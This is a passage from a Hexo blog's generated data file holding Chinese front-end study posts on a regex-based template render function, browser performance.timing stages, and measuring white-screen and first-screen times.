title=\"简单实现\"></a>简单实现</h2><ul>\n<li>所以有上面的简单铺垫，可以简单写出</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span>(<span class=\"params\">template, context</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> template.replace(<span class=\"regexp\">/\\&#123;\\&#123;(.*?)\\&#125;\\&#125;/g</span>, (match, key) =&gt; &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(match, key); <span class=\"comment\">//match是&#123;&#123;name &#125;&#125;，key是name</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> context[key.trim()];</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//可以使用trim去掉前后空格</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> template = <span class=\"string\">\"我是&#123;&#123;name   &#125;&#125;，现在&#123;&#123;age   &#125;&#125;岁\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> context = &#123; <span class=\"attr\">name</span>: <span class=\"string\">\"yoki\"</span>, <span class=\"attr\">age</span>: <span class=\"string\">\"20\"</span> &#125;;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(render(template, context));</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"简单介绍\"><a href=\"#简单介绍\" class=\"headerlink\" title=\"简单介绍\"></a>简单介绍</h2><blockquote>\n<p>看到 vue 模板里都是用包含变量，然后替换成变量，觉得比字符串拼接实在是好太多了</p>\n</blockquote>\n<ul>\n<li>es6 的字符串模板用起来实在是舒服，所以简单用实现一下</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 首先 str.replace(regexp|substr, newSubStr|function) ，replace 可以传递一个函数</span></span><br><span class=\"line\">str.replace(reg,<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">match,key</span>)=&gt;</span>&#123;&#125;)</span><br><span class=\"line\"><span class=\"comment\">//正则匹配&#123;&#123;内容&#125;&#125;，应该是/\\&#123;\\&#123;(.*?)\\&#125;\\&#125;/，用\\转义&#123;和&#125;</span></span><br><span class=\"line\"><span class=\"comment\">// /\\&#123;\\&#123;(.*?)\\&#125;\\&#125;/g;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"正则表达\"><a href=\"#正则表达\" class=\"headerlink\" title=\"正则表达\"></a>正则表达</h2><ul>\n<li><strong>.*?</strong>是正则的固定搭配用法，就是表示非贪婪模式，尽可能匹配少的意思</li>\n<li><strong>.*</strong>则表示贪婪模式</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">源字符串：aa&lt;div&gt;test1&lt;<span class=\"regexp\">/div&gt;bb&lt;div&gt;test2&lt;/</span>div&gt;cc</span><br><span class=\"line\"></span><br><span class=\"line\">正则表达式一：&lt;div&gt;.*&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">匹配结果一：&lt;div&gt;test1&lt;<span class=\"regexp\">/div&gt;bb&lt;div&gt;test2&lt;/</span>div&gt;(从头部匹配到尾部，从第一个div到最后的那个&lt;<span class=\"regexp\">/div&gt;)</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">正则表达式二：&lt;div&gt;.*?&lt;/</span>div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">匹配结果二：&lt;div&gt;test1&lt;<span class=\"regexp\">/div&gt;（这里指的是一次匹配结果，不使用\\/g，所以没包括&lt;div&gt;test2&lt;/</span>div&gt;）</span><br></pre></td></tr></table></figure>\n<h2 id=\"简单实现\"><a href=\"#简单实现\" class=\"headerlink\" title=\"简单实现\"></a>简单实现</h2><ul>\n<li>所以有上面的简单铺垫，可以简单写出</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span>(<span class=\"params\">template, context</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> template.replace(<span class=\"regexp\">/\\&#123;\\&#123;(.*?)\\&#125;\\&#125;/g</span>, (match, key) =&gt; &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(match, key); <span class=\"comment\">//match是&#123;&#123;name &#125;&#125;，key是name</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> context[key.trim()];</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//可以使用trim去掉前后空格</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> template = <span class=\"string\">\"我是&#123;&#123;name   &#125;&#125;，现在&#123;&#123;age   &#125;&#125;岁\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> context = &#123; <span class=\"attr\">name</span>: <span class=\"string\">\"yoki\"</span>, <span class=\"attr\">age</span>: <span class=\"string\">\"20\"</span> &#125;;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(render(template, context));</span><br></pre></td></tr></table></figure>\n"},{"title":"前端性能之用户可操作时间","date":"2018-05-23T03:53:12.000Z","_content":"\n# 官方的一个浏览器从打开一个页面内部的一系列状态\n\n- 用 performance.timing 的 api 就可以获取到各个阶段的\n- 一般 start 和 end 间包括一个阶段\n- 具体可以观察推荐阅读的那张图\n- navigationStart 到 responseEnd 之间是网络传输层面\n- domLoading 到 domComplete 是服务器传输回字节后浏览器的各种事件状态\n  - domLoading\n  - domInteractive(dom tree 构建完成)\n  - domContentLoadedEventStart(触发的是 domContentLoaded 事件，这个很重要，network 都有体现)\n  - domContentLoadedEventEnd\n  - domComplete（资源全部加载完成，包括异步 js）\n  - loadEventStart（触发 load 事件）\n  - loadEventEnd\n\n# 用户可操作时间\n\n> 用户可以进行正常的事件输入交互操作\n\n- 就是 domContentLoadedEventEnd-navigationStart 的时间\n- jq 的$()就是指 domContentLoaded 事件\n\n# 一些知识点\n\n- document 到达 domInteractive 状态的时候，代表 dom 树的构建完成\n- 浏览器拿到文档首字节之后，也就是 responseEnd 之后。浏览器将 html 解析并构建成 DOM tree，同时将 css 解析成 cssom，这个过程是同步的\n- 如果有 js 参与，因为同步的 js 可以改写文档在任何节点，所以 domtree 一旦碰上同步的 script 标签就会停止构建\n- js 能查询 dom 对象的可被计算的样式，cssom 构建完之后才轮到 js 执行，但是这是指 css 文件在 js 之前，如果 css 在 js 之后，不会阻塞 js\n\n# 推荐阅读\n\n- [前端性能的几个基础指标](https://segmentfault.com/a/1190000005784687)\n","source":"_posts/study-screen-02.md","raw":"---\ntitle: 前端性能之用户可操作时间\ndate: 2018-05-23 11:53:12\ntags: 浏览器\n---\n\n# 官方的一个浏览器从打开一个页面内部的一系列状态\n\n- 用 performance.timing 的 api 就可以获取到各个阶段的\n- 一般 start 和 end 间包括一个阶段\n- 具体可以观察推荐阅读的那张图\n- navigationStart 到 responseEnd 之间是网络传输层面\n- domLoading 到 domComplete 是服务器传输回字节后浏览器的各种事件状态\n  - domLoading\n  - domInteractive(dom tree 构建完成)\n  - domContentLoadedEventStart(触发的是 domContentLoaded 事件，这个很重要，network 都有体现)\n  - domContentLoadedEventEnd\n  - domComplete（资源全部加载完成，包括异步 js）\n  - loadEventStart（触发 load 事件）\n  - loadEventEnd\n\n# 用户可操作时间\n\n> 用户可以进行正常的事件输入交互操作\n\n- 就是 domContentLoadedEventEnd-navigationStart 的时间\n- jq 的$()就是指 domContentLoaded 事件\n\n# 一些知识点\n\n- document 到达 domInteractive 状态的时候，代表 dom 树的构建完成\n- 浏览器拿到文档首字节之后，也就是 responseEnd 之后。浏览器将 html 解析并构建成 DOM tree，同时将 css 解析成 cssom，这个过程是同步的\n- 如果有 js 参与，因为同步的 js 可以改写文档在任何节点，所以 domtree 一旦碰上同步的 script 标签就会停止构建\n- js 能查询 dom 对象的可被计算的样式，cssom 构建完之后才轮到 js 执行，但是这是指 css 文件在 js 之前，如果 css 在 js 之后，不会阻塞 js\n\n# 推荐阅读\n\n- [前端性能的几个基础指标](https://segmentfault.com/a/1190000005784687)\n","slug":"study-screen-02","published":1,"updated":"2018-07-06T08:56:54.492Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034s0003z0iofg6vpo6az","content":"<h1 id=\"官方的一个浏览器从打开一个页面内部的一系列状态\"><a href=\"#官方的一个浏览器从打开一个页面内部的一系列状态\" class=\"headerlink\" title=\"官方的一个浏览器从打开一个页面内部的一系列状态\"></a>官方的一个浏览器从打开一个页面内部的一系列状态</h1><ul>\n<li>用 performance.timing 的 api 就可以获取到各个阶段的</li>\n<li>一般 start 和 end 间包括一个阶段</li>\n<li>具体可以观察推荐阅读的那张图</li>\n<li>navigationStart 到 responseEnd 之间是网络传输层面</li>\n<li>domLoading 到 domComplete 是服务器传输回字节后浏览器的各种事件状态<ul>\n<li>domLoading</li>\n<li>domInteractive(dom tree 构建完成)</li>\n<li>domContentLoadedEventStart(触发的是 domContentLoaded 事件，这个很重要，network 都有体现)</li>\n<li>domContentLoadedEventEnd</li>\n<li>domComplete（资源全部加载完成，包括异步 js）</li>\n<li>loadEventStart（触发 load 事件）</li>\n<li>loadEventEnd</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"用户可操作时间\"><a href=\"#用户可操作时间\" class=\"headerlink\" title=\"用户可操作时间\"></a>用户可操作时间</h1><blockquote>\n<p>用户可以进行正常的事件输入交互操作</p>\n</blockquote>\n<ul>\n<li>就是 domContentLoadedEventEnd-navigationStart 的时间</li>\n<li>jq 的$()就是指 domContentLoaded 事件</li>\n</ul>\n<h1 id=\"一些知识点\"><a href=\"#一些知识点\" class=\"headerlink\" title=\"一些知识点\"></a>一些知识点</h1><ul>\n<li>document 到达 domInteractive 状态的时候，代表 dom 树的构建完成</li>\n<li>浏览器拿到文档首字节之后，也就是 responseEnd 之后。浏览器将 html 解析并构建成 DOM tree，同时将 css 解析成 cssom，这个过程是同步的</li>\n<li>如果有 js 参与，因为同步的 js 可以改写文档在任何节点，所以 domtree 一旦碰上同步的 script 标签就会停止构建</li>\n<li>js 能查询 dom 对象的可被计算的样式，cssom 构建完之后才轮到 js 执行，但是这是指 css 文件在 js 之前，如果 css 在 js 之后，不会阻塞 js</li>\n</ul>\n<h1 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h1><ul>\n<li><a href=\"https://segmentfault.com/a/1190000005784687\" target=\"_blank\" rel=\"noopener\">前端性能的几个基础指标</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"官方的一个浏览器从打开一个页面内部的一系列状态\"><a href=\"#官方的一个浏览器从打开一个页面内部的一系列状态\" class=\"headerlink\" title=\"官方的一个浏览器从打开一个页面内部的一系列状态\"></a>官方的一个浏览器从打开一个页面内部的一系列状态</h1><ul>\n<li>用 performance.timing 的 api 就可以获取到各个阶段的</li>\n<li>一般 start 和 end 间包括一个阶段</li>\n<li>具体可以观察推荐阅读的那张图</li>\n<li>navigationStart 到 responseEnd 之间是网络传输层面</li>\n<li>domLoading 到 domComplete 是服务器传输回字节后浏览器的各种事件状态<ul>\n<li>domLoading</li>\n<li>domInteractive(dom tree 构建完成)</li>\n<li>domContentLoadedEventStart(触发的是 domContentLoaded 事件，这个很重要，network 都有体现)</li>\n<li>domContentLoadedEventEnd</li>\n<li>domComplete（资源全部加载完成，包括异步 js）</li>\n<li>loadEventStart（触发 load 事件）</li>\n<li>loadEventEnd</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"用户可操作时间\"><a href=\"#用户可操作时间\" class=\"headerlink\" title=\"用户可操作时间\"></a>用户可操作时间</h1><blockquote>\n<p>用户可以进行正常的事件输入交互操作</p>\n</blockquote>\n<ul>\n<li>就是 domContentLoadedEventEnd-navigationStart 的时间</li>\n<li>jq 的$()就是指 domContentLoaded 事件</li>\n</ul>\n<h1 id=\"一些知识点\"><a href=\"#一些知识点\" class=\"headerlink\" title=\"一些知识点\"></a>一些知识点</h1><ul>\n<li>document 到达 domInteractive 状态的时候，代表 dom 树的构建完成</li>\n<li>浏览器拿到文档首字节之后，也就是 responseEnd 之后。浏览器将 html 解析并构建成 DOM tree，同时将 css 解析成 cssom，这个过程是同步的</li>\n<li>如果有 js 参与，因为同步的 js 可以改写文档在任何节点，所以 domtree 一旦碰上同步的 script 标签就会停止构建</li>\n<li>js 能查询 dom 对象的可被计算的样式，cssom 构建完之后才轮到 js 执行，但是这是指 css 文件在 js 之前，如果 css 在 js 之后，不会阻塞 js</li>\n</ul>\n<h1 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h1><ul>\n<li><a href=\"https://segmentfault.com/a/1190000005784687\" target=\"_blank\" rel=\"noopener\">前端性能的几个基础指标</a></li>\n</ul>\n"},{"title":"白屏和首屏时间","date":"2018-05-22T13:23:28.000Z","_content":"\n# 白屏时间\n\n> 浏览器开始显示内容的时间。从我们输入网址，到浏览器出现第一个字符的时间\n\n* chrome 有自己的 api，window.chrome.loadTimes().firstPaintTime \\* 1000 - window.performance.timing.navigationStart\n\n## 如何计算\n\n通常认为浏览器开始渲染 body 标签或者解析完 head 标签的时刻就是页面白屏结束的时间\n\n```javascript\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <title>白屏</title>\n  <script type=\"text/javascript\">\n    // 不兼容performance.timing 的浏览器，如IE8\n    window.pageStartTime = Date.now();\n  </script>\n  <!-- 页面 CSS 资源 -->\n  <link rel=\"stylesheet\" href=\"common.css\">\n  <link rel=\"stylesheet\" href=\"page.css\">\n  <script type=\"text/javascript\">\n    // 白屏时间\b结束点\n    window.firstPaint = Date.now();\n  </script>\n</head>\n<body>\n  <!-- 页面内容 -->\n</body>\n</html>\n```\n\n* 如果可以使用 performance api 的时候，白屏时间=firstPaint - performance.timing.navigationStart（浏览器打开网站开始）\n* 如果不可以使用，比如 ie8，那么白屏时间= firstPaint - pageStartTime\n\n# 首屏时间\n\n> 指用户打开网站开始，到浏览器首屏内容渲染完成的时间。一般来说，5s 内优秀，10 之内可以接受，10s 以上不可以接受\n\n## 怎么计算\n\n> 1.首屏模块标签标记法，2.统计首屏内加载最慢的图片的时间，3.自定义首屏内容计算法\n\n### 首屏模块标签标记法\n\n* 适用于首屏内容不需要通过拉取数据才能生存以及页面不考虑图片等资源加载的情况。\n* 但是现在大多数情况都需要通过接口拉数据才能完整显示，所以这个不太使用\n\n```javascript\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <title>首屏</title>\n  <script type=\"text/javascript\">\n    window.pageStartTime = Date.now();\n  </script>\n  <link rel=\"stylesheet\" href=\"common.css\">\n  <link rel=\"stylesheet\" href=\"page.css\">\n</head>\n<body>\n  <!-- 首屏可见模块1 -->\n  <div class=\"module-1\"></div>\n  <!-- 首屏可见模块2 -->\n  <div class=\"module-2\"></div>\n  <script type=\"text/javascript\">\n    window.firstScreen = Date.now();\n  </script>\n  <!-- 首屏不可见模块3 -->\n  <div class=\"module-3\"></div>\n    <!-- 首屏不可见模块4 -->\n  <div class=\"module-4\"></div>\n</body>\n</html>\n```\n\n### 统计首屏内图片完成加载的时间\n\n* 通常首屏内容加载最慢的就是图片资源，因此我们会把首屏内加载最慢的图片的时间当作首屏时间\n* 遍历首屏内所有图片标签，并且监听所有图片标签的 onload 事件，最终遍历图片标签的加载时间的最大值，然后用这个最大值减去 navigationStart\n\n### 自定义模块内容计算法\n\n* 由于统计图片加载时间比较复杂，通常会自定义模块内容，来简化\n* 忽略图片等资源加载情况，只考虑页面主要 dom\n* 只考虑首屏的主要模块，而不是严格意义首屏线上的所有内容\n\n# 推荐阅读\n\n* [7 天打造前端性能监控系统](http://fex.baidu.com/blog/2014/05/build-performance-monitor-in-7-days/)\n","source":"_posts/study-screen-01.md","raw":"---\ntitle: 白屏和首屏时间\ndate: 2018-05-22 21:23:28\ntags: 浏览器\n---\n\n# 白屏时间\n\n> 浏览器开始显示内容的时间。从我们输入网址，到浏览器出现第一个字符的时间\n\n* chrome 有自己的 api，window.chrome.loadTimes().firstPaintTime \\* 1000 - window.performance.timing.navigationStart\n\n## 如何计算\n\n通常认为浏览器开始渲染 body 标签或者解析完 head 标签的时刻就是页面白屏结束的时间\n\n```javascript\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <title>白屏</title>\n  <script type=\"text/javascript\">\n    // 不兼容performance.timing 的浏览器，如IE8\n    window.pageStartTime = Date.now();\n  </script>\n  <!-- 页面 CSS 资源 -->\n  <link rel=\"stylesheet\" href=\"common.css\">\n  <link rel=\"stylesheet\" href=\"page.css\">\n  <script type=\"text/javascript\">\n    // 白屏时间\b结束点\n    window.firstPaint = Date.now();\n  </script>\n</head>\n<body>\n  <!-- 页面内容 -->\n</body>\n</html>\n```\n\n* 如果可以使用 performance api 的时候，白屏时间=firstPaint - performance.timing.navigationStart（浏览器打开网站开始）\n* 如果不可以使用，比如 ie8，那么白屏时间= firstPaint - pageStartTime\n\n# 首屏时间\n\n> 指用户打开网站开始，到浏览器首屏内容渲染完成的时间。一般来说，5s 内优秀，10 之内可以接受，10s 以上不可以接受\n\n## 怎么计算\n\n> 1.首屏模块标签标记法，2.统计首屏内加载最慢的图片的时间，3.自定义首屏内容计算法\n\n### 首屏模块标签标记法\n\n* 适用于首屏内容不需要通过拉取数据才能生存以及页面不考虑图片等资源加载的情况。\n* 但是现在大多数情况都需要通过接口拉数据才能完整显示，所以这个不太使用\n\n```javascript\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <title>首屏</title>\n  <script type=\"text/javascript\">\n    window.pageStartTime = Date.now();\n  </script>\n  <link rel=\"stylesheet\" href=\"common.css\">\n  <link rel=\"stylesheet\" href=\"page.css\">\n</head>\n<body>\n  <!-- 首屏可见模块1 -->\n  <div class=\"module-1\"></div>\n  <!-- 首屏可见模块2 -->\n  <div class=\"module-2\"></div>\n  <script type=\"text/javascript\">\n    window.firstScreen = Date.now();\n  </script>\n  <!-- 首屏不可见模块3 -->\n  <div class=\"module-3\"></div>\n    <!-- 首屏不可见模块4 -->\n  <div class=\"module-4\"></div>\n</body>\n</html>\n```\n\n### 统计首屏内图片完成加载的时间\n\n* 通常首屏内容加载最慢的就是图片资源，因此我们会把首屏内加载最慢的图片的时间当作首屏时间\n* 遍历首屏内所有图片标签，并且监听所有图片标签的 onload 事件，最终遍历图片标签的加载时间的最大值，然后用这个最大值减去 navigationStart\n\n### 自定义模块内容计算法\n\n* 由于统计图片加载时间比较复杂，通常会自定义模块内容，来简化\n* 忽略图片等资源加载情况，只考虑页面主要 dom\n* 只考虑首屏的主要模块，而不是严格意义首屏线上的所有内容\n\n# 推荐阅读\n\n* [7 天打造前端性能监控系统](http://fex.baidu.com/blog/2014/05/build-performance-monitor-in-7-days/)\n","slug":"study-screen-01","published":1,"updated":"2018-05-23T03:52:58.192Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034s000410iofk9vmc74c","content":"<h1 id=\"白屏时间\"><a href=\"#白屏时间\" class=\"headerlink\" title=\"白屏时间\"></a>白屏时间</h1><blockquote>\n<p>浏览器开始显示内容的时间。从我们输入网址，到浏览器出现第一个字符的时间</p>\n</blockquote>\n<ul>\n<li>chrome 有自己的 api，window.chrome.loadTimes().firstPaintTime * 1000 - window.performance.timing.navigationStart</li>\n</ul>\n<h2 id=\"如何计算\"><a href=\"#如何计算\" class=\"headerlink\" title=\"如何计算\"></a>如何计算</h2><p>通常认为浏览器开始渲染 body 标签或者解析完 head 标签的时刻就是页面白屏结束的时间</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang=<span class=\"string\">\"en\"</span>&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">  &lt;meta charset=<span class=\"string\">\"UTF-8\"</span>&gt;</span><br><span class=\"line\">  &lt;title&gt;白屏&lt;<span class=\"regexp\">/title&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  &lt;script type=\"text/</span>javascript<span class=\"string\">\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">    // 不兼容performance.timing 的浏览器，如IE8</span></span><br><span class=\"line\"><span class=\"string\">    window.pageStartTime = Date.now();</span></span><br><span class=\"line\"><span class=\"string\">  &lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;!-- 页面 CSS 资源 --&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;link rel=\"</span>stylesheet<span class=\"string\">\" href=\"</span>common.css<span class=\"string\">\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;link rel=\"</span>stylesheet<span class=\"string\">\" href=\"</span>page.css<span class=\"string\">\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;script type=\"</span>text/javascript<span class=\"string\">\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">    // 白屏时间\b结束点</span></span><br><span class=\"line\"><span class=\"string\">    window.firstPaint = Date.now();</span></span><br><span class=\"line\"><span class=\"string\">  &lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/head&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;body&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;!-- 页面内容 --&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/body&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>如果可以使用 performance api 的时候，白屏时间=firstPaint - performance.timing.navigationStart（浏览器打开网站开始）</li>\n<li>如果不可以使用，比如 ie8，那么白屏时间= firstPaint - pageStartTime</li>\n</ul>\n<h1 id=\"首屏时间\"><a href=\"#首屏时间\" class=\"headerlink\" title=\"首屏时间\"></a>首屏时间</h1><blockquote>\n<p>指用户打开网站开始，到浏览器首屏内容渲染完成的时间。一般来说，5s 内优秀，10 之内可以接受，10s 以上不可以接受</p>\n</blockquote>\n<h2 id=\"怎么计算\"><a href=\"#怎么计算\" class=\"headerlink\" title=\"怎么计算\"></a>怎么计算</h2><blockquote>\n<p>1.首屏模块标签标记法，2.统计首屏内加载最慢的图片的时间，3.自定义首屏内容计算法</p>\n</blockquote>\n<h3 id=\"首屏模块标签标记法\"><a href=\"#首屏模块标签标记法\" class=\"headerlink\" title=\"首屏模块标签标记法\"></a>首屏模块标签标记法</h3><ul>\n<li>适用于首屏内容不需要通过拉取数据才能生存以及页面不考虑图片等资源加载的情况。</li>\n<li>但是现在大多数情况都需要通过接口拉数据才能完整显示，所以这个不太使用</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang=<span class=\"string\">\"en\"</span>&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">  &lt;meta charset=<span class=\"string\">\"UTF-8\"</span>&gt;</span><br><span class=\"line\">  &lt;title&gt;首屏&lt;<span class=\"regexp\">/title&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  &lt;script type=\"text/</span>javascript<span class=\"string\">\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">    window.pageStartTime = Date.now();</span></span><br><span class=\"line\"><span class=\"string\">  &lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;link rel=\"</span>stylesheet<span class=\"string\">\" href=\"</span>common.css<span class=\"string\">\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;link rel=\"</span>stylesheet<span class=\"string\">\" href=\"</span>page.css<span class=\"string\">\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/head&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;body&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;!-- 首屏可见模块1 --&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;div class=\"</span><span class=\"built_in\">module</span><span class=\"number\">-1</span><span class=\"string\">\"&gt;&lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;!-- 首屏可见模块2 --&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;div class=\"</span><span class=\"built_in\">module</span><span class=\"number\">-2</span><span class=\"string\">\"&gt;&lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;script type=\"</span>text/javascript<span class=\"string\">\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">    window.firstScreen = Date.now();</span></span><br><span class=\"line\"><span class=\"string\">  &lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;!-- 首屏不可见模块3 --&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;div class=\"</span><span class=\"built_in\">module</span><span class=\"number\">-3</span><span class=\"string\">\"&gt;&lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;!-- 首屏不可见模块4 --&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;div class=\"</span><span class=\"built_in\">module</span><span class=\"number\">-4</span><span class=\"string\">\"&gt;&lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/body&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"统计首屏内图片完成加载的时间\"><a href=\"#统计首屏内图片完成加载的时间\" class=\"headerlink\" title=\"统计首屏内图片完成加载的时间\"></a>统计首屏内图片完成加载的时间</h3><ul>\n<li>通常首屏内容加载最慢的就是图片资源，因此我们会把首屏内加载最慢的图片的时间当作首屏时间</li>\n<li>遍历首屏内所有图片标签，并且监听所有图片标签的 onload 事件，最终遍历图片标签的加载时间的最大值，然后用这个最大值减去 navigationStart</li>\n</ul>\n<h3 id=\"自定义模块内容计算法\"><a href=\"#自定义模块内容计算法\" class=\"headerlink\" title=\"自定义模块内容计算法\"></a>自定义模块内容计算法</h3><ul>\n<li>由于统计图片加载时间比较复杂，通常会自定义模块内容，来简化</li>\n<li>忽略图片等资源加载情况，只考虑页面主要 dom</li>\n<li>只考虑首屏的主要模块，而不是严格意义首屏线上的所有内容</li>\n</ul>\n<h1 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h1><ul>\n<li><a href=\"http://fex.baidu.com/blog/2014/05/build-performance-monitor-in-7-days/\" target=\"_blank\" rel=\"noopener\">7 天打造前端性能监控系统</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"白屏时间\"><a href=\"#白屏时间\" class=\"headerlink\" title=\"白屏时间\"></a>白屏时间</h1><blockquote>\n<p>浏览器开始显示内容的时间。从我们输入网址，到浏览器出现第一个字符的时间</p>\n</blockquote>\n<ul>\n<li>chrome 有自己的 api，window.chrome.loadTimes().firstPaintTime * 1000 - window.performance.timing.navigationStart</li>\n</ul>\n<h2 id=\"如何计算\"><a href=\"#如何计算\" 